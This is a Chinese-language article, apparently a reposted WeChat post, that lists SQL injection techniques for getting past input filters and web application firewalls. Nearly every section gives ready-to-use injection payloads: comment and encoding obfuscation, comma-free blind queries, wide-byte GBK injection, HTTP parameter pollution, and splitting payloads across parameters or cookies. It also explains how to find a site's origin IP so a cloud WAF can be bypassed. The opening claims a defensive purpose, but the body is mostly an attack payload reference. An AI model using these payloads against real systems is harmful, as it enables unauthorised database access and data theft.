> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU0OTE4MzYzMw==&mid=2247515011&idx=3&sn=29b505a1e1ca15b9b144e3fe685fbad5&chksm=fbb1327dccc6bb6bb1c46f3bb30089f8271d19884e6d7356fab2cc9dc866dcc0648fd9691c4e&mpshare=1&scene=1&srcid=0708MNq6SCZjNrp4G9mQwHIZ&sharer_sharetime=1625734031460&sharer_shareid=7fece245937ac96f04f0fb8e1311fff1#rd)

今天给大家再次分享一篇硬核内容，那就是黑客常用的 SQL 注入绕过技术，还是那句话：我们学渗透技术不是为了攻击别人的系统，而是了解黑客常用的渗透技能，以此来修复我们自己系统中的漏洞，使我们的系统更加健壮，更加安全。

### 1. 绕过空格（注释符 /* */，%a0）

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/


```

```
/*  注释 */


```

![](https://mmbiz.qpic.cn/mmbiz_png/2hHcUic5FEwHvMYBXaBBKqlfSNXA161RVU9KYhewiacgMWd0Dh4MspicuutsRL277jrQN7mfxWI4I7IH2HGVfB9Cw/640?wx_fmt=png)

```
select * from users where id=8E0union select 1,2,3
select * from users where id=8.0 select 1,2,3


```

### 2. 括号绕过空格

```
select(user())from dual where(1=1)and(2=2)


```

```
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23


```

### 3. 引号绕过（使用十六进制）

```
select column_name  from information_schema.tables where table_


```

```
select column_name  from information_schema.tables where table_name=0x7573657273


```

### 4. 逗号绕过（使用 from 或者 offset）

在使用盲注的时候，需要使用到 substr(),mid(),limit。这些子句方法都需要使用到逗号。对于 substr() 和 mid() 这两个方法可以使用 from to 的方式来解决：

```
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);


```

使用 join：

```
union select 1,2     #等价于
union select * from (select 1)a join (select 2)b


```

使用 like：

```
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'


```

对于 limit 可以使用 offset 来绕过：

```
select * from news limit 0,1


```

# 等价于下面这条 SQL 语句

```
select * from news limit 1 offset 0


```

### 5. 比较符号（<>）绕过（过滤了 <>：sqlmap 盲注经常使用 <>，使用 between 的脚本）

使用 greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest 来进行绕过了。最常见的一个盲注的 sql 语句：

```
select * from users where id=1 and ascii(substr(database(),0,1))>64


```

此时如果比较操作符被过滤，上面的盲注语句则无法使用, 那么就可以使用 greatest 来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数 (n1,n2,n3,...) 的最大值。那么上面的这条 sql 语句可以使用 greatest 变为如下的子句:

```
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64


```

使用 between and：between a and b：返回 a，b 之间的数据，不包含 b。

### 6.or and xor not 绕过

```
and=&&  or=||   xor=|   not=!


```

### 7. 绕过注释符号（#，--(后面跟一个空格））过滤

```
id=1' union select 1,2,3||'1


```

最后的 or '1 闭合查询语句的最后的单引号，或者：

```
id=1' union select 1,2,'3


```

### 8.= 绕过

使用 like 、rlike 、regexp 或者 使用 <或者>

### 9. 绕过 union，select，where 等

**（1）使用注释符绕过**

常用注释符：

```
//，-- , /**/, #, --+, -- -, ;,%00,--a


```

用法：

```
U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user


```

**（2）使用大小写绕过**

```
id=-1'UnIoN/**/SeLeCT


```

**（3）内联注释绕过**

```
id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#


```

**（4） 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）**

```
id=-1'UNIunionONSeLselectECT1,2,3–-


```

### 10. 通用绕过（编码）

如 URLEncode 编码，ASCII,HEX,unicode 编码绕过：

```
or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。


```

### 11. 等价函数绕过

```
hex()、bin() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()


```

举例：substring() 和 substr() 无法使用时：

```
?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74


```

或者：

```
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1


```

### 12. 宽字节注入

过滤 '的时候往往利用的思路是将' 转换为 '。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：（1）%df 吃掉 \ 具体的方法是 urlencode(') = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：

```
id=-1%df%27union select 1,user(),3--+


```

（2）将 '中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。一般产生宽字节注入的 PHP 函数：1.replace（）：过滤' \ ，将 '转化为' ，将 \ 转为 \，将 "转为" 。用思路一。2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：'," , \ 。用思路一 （防御此漏洞，要将 mysql_query 设置为 binary 的方式） 3.mysql_real_escape_string()：转义下列字符：

```
\x00     \n     \r     \     '     "     \x1a


```

（防御，将 mysql 设置为 gbk 即可）

### 13. 多参数请求拆分

对于多个参数拼接到同一条 SQL 语句中的情况，可以将注入语句分割插入。

例如请求 URL 时，GET 参数格式如下：

```
a=[input1]&b=[input2]


```

将 GET 的参数 a 和参数 b 拼接到 SQL 语句中，SQL 语句如下所示。

```
and a=[input1] and b=[input2]


```

这时就可以将注入语句进行拆分，如下所示：

```
a=union/*&b=*/select 1,2,3,4


```

最终将参数 a 和参数 b 拼接，得到的 SQL 语句如下所示：

```
and a=union /*and b=*/select 1,2,3,4


```

### 14.HTTP 参数污染

HTTP 参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。具体如下图所示：（以参数 color=red&color=blue 为例）。

![](https://mmbiz.qpic.cn/mmbiz_jpg/2hHcUic5FEwHvMYBXaBBKqlfSNXA161RVYF3FQm2EFp8cEAUkNiaDBwH89dSZ3SU3F3lEialhyTjun5954SySWKBQ/640?wx_fmt=jpeg)

可见，IIS 比较容易利用，可以直接分割带逗号的 SQL 语句。在其余的中间件中，如果 WAF 只检测了通参数名中的第一个或最后一个，并且中间件的特性正好取与 WAF 相反的参数，则可成功绕过。下面以 IIS 为例，一般的 SQL 注入语句如下所示：

```
Inject=union select 1,2,3,4


```

将 SQL 注入语句转换为以下格式。

```
Inject=union/*&inject=*/select/*&inject=*/1&inject=2&inject=3&inject=4


```

最终在 IIS 中读取的参数值将如下所示

```
Inject=union/*, */select/*, */1,2,3,4


```

### 15. 生僻函数

使用生僻函数替代常见的函数，例如在报错注入中使用 polygon() 函数替换常用的 updatexml() 函数

```
select polygon((select * from (select * from (select @@version) f) x));


```

### 16. 寻找网站源 IP

对于具有云 WAF 防护的网站，只要找到网站的 IP 地址，通过 IP 访问网站，就可以绕过云 WAF 检测。

常见的寻找网站 IP 的方法由以下几种

*   寻找网站的历史解析记录
    
*   多个不同区域 ping 网站，查看 IP 解析的结果
    
*   找网站的二级域名、NS、MX 记录等对应的 IP
    
*   订阅网站邮件，查看邮件发送方的 IP
    

### 17. 注入参数到 cookie 中

`某些程序员在代码中使用$_REQUEST获取参数，而$_REQUEST会依次从GET/POST/cookie中获取参数，如果WAF只检测了GET/POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。`